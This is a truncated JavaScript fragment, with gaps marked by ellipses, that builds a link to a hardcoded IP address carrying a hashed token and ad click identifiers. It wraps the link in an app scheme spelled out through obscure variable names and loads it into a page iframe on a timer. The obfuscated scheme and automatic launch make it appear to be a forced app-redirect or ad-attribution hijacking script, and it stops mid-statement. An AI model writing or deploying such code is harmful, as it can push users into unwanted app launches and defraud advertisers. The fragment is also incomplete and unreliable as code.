function getUrlParam(paraName) {
    ...
    function oa(u,a) {
        if(zx_flag ==0 && ch_flag ==1){
			...
			mm=md5(encodeURIComponent(nowdate+'index'));
			a = 'http%3A%2F%2F47.105.184.85%2Fmq%2Findex_or2%3Fid%3D'+u+'%26from%3D'+mm;
            var iframe = document.getElementById("iframe1");
            if(!clickid || (adid == "__AID__") || (AD == "external_url")){
            }else{
                if(isiOS){
                    setTimeout(function(){
                        url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+nowdate );
                        iframe.src = url;
                    },500);
                }else{
                    url = jd + kobe + lb + "://" + wade + kd +"?url="+a+encodeURIComponent("&adid=" + adid + "&creativeid=" + creativeid + "&clickid=" + clickid + "&creativetype=" + creativetype + "&t="+nowdate );
